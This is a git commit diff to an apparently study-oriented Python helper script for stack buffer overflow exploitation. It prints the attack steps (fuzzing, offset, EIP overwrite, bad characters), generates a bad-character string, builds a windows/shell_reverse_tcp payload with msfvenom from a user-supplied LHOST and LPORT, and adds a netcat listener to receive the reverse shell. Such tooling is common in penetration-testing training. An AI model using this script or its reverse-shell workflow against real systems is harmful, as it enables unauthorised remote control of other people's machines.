e5f4edc58c9135ef44e00ab6504565d00d1d03cf
Cameron Edmondson <42309690+cdedmondson@users.noreply.github.com>
2020-04-03 13:02:26 -0700

    Update buffer_overflow.py

--- buffer_overflow.py
+++ buffer_overflow.py
@@ -1,28 +1,32 @@
 import subprocess
 import sys
+import textwrap
 
 
-def menu():
-    print("####################################")
-    print("# Steps to Conduct Buffer Overflow #")
-    print("####################################")
-    print("1. Fuzzing")
-    print("   [a] Send bytes of data in increments of 100 bytes")
-    print("   [b] Wait for crash and note the byte count")
-    print("2. Find the Offset")
-    print("   [a] Send unique bytes the same length noted in step 1.b")
-    print("   [b] Copy unique bytes in EIP")
-    print("   [c] Find offset by passing in the length (noted 1.b) and unique bytes found in 2.b")
-    print("3. Overwrite the EIP")
-    print("   [a] Once we have the offset send ‘A’s the same size as offset, then four ‘B’s to make sure" +
-          "we have control of eip example: shell_code = 'A' * 2003 + 'B' * 4 ")
-    print("   [b] The eip should be overwritten with ‘42424242’ (if not redo step 2)")
-    print("4. Find bad characters")
-    print("   [a] Send all possible 255 characters in hex and look for abnormal characters " +
-          "(updated code may look something like this: buffer = 'A' * 2606 + 'B' * 4 + badchars)")
-    print("5. Find the right module")
-    print("6. Generate shell code")
-    print("7. You already know\n")
+def bof_steps():
+    print(textwrap.dedent(
+        '''
+        ####################################
+        # Steps to Conduct Buffer Overflow #
+        ####################################
+        1. Fuzzing
+           [a] Send bytes of data in increments of 100 bytes
+           [b] Wait for crash and note the byte count
+        2. Find the Offset
+           [a] Send unique bytes the same length noted in step 1.b
+           [b] Copy unique bytes in EIP
+           [c] Find offset by passing in the length (noted 1.b) and unique bytes found in 2.b
+        3. Overwrite the EIP
+           [a] Once we have the offset send ‘A’s the same size as offset, then four ‘B’s to make sure
+               we have control of eip example: shell_code = 'A' * 2003 + 'B' * 4
+           [b] The eip should be overwritten with ‘42424242’ (if not redo step 2)
+        4. Find bad characters
+           [a] Send all possible 255 characters in hex and look for abnormal characters
+               (updated code may look something like this: buffer = 'A' * 2606 + 'B' * 4 + badchars)
+        5. Find the right module
+        6. Generate shell code
+        7. You already know\n
+        '''))
 
 
 def finding_offset():
@@ -46,24 +50,32 @@ def finding_offset():
 
 
 def bad_characters():
+    counter = 0
     print("\n[+] Bad Characters 1-255\n")
-
+    print("badchars=(")
     for chars in range(1, 256):
+        if counter == 0:
+            print('"', end="")
+        elif counter % 16 == 0:
+            print('"', end="")
         sys.stdout.write("\\x" + '{:02x}'.format(chars))
+        if chars % 16 == 0:
+            print('"')
+        counter = counter + 1
 
-    print("\n")
+    print('"', end="" + ")" + "\n\n")
 
 
 def generate_payload():
     ip = input("[*] Enter LHOST (ip of your machine):")
-    port = input("[*] Enter LPORT (port you want reverse to call back to):")
+    lport = input("[*] Enter LPORT (port you want reverse to call back to):")
     badchars = input("[*] Enter badcharacters found in step 4:")
 
     msfvenom = "msfvenom"
     switch_payload = "-p"
     payload = "windows/shell_reverse_tcp"
     lhost = f"LHOST={ip}"
-    lport = f"LPORT={ip}"
+    lport = f"LPORT={lport}"
     no_crash = "EXITFUNC=thread"
     switch_format = "-f"
     format = "c"
@@ -75,9 +87,16 @@ def generate_payload():
         [msfvenom, switch_payload, payload, lhost, lport, no_crash, switch_format, format, switch_architecture,
          architecture, switch_badchars, badchars])
 
+    nc_listener(lport)
+
+
+def nc_listener(lport):
+    print(f"Necat listener listening on local port {lport}")
+    subprocess.run(f"nc -nlvp {lport}")
+
 
 def main():
-    menu()
+    bof_steps()
 
     finding_offset()
 
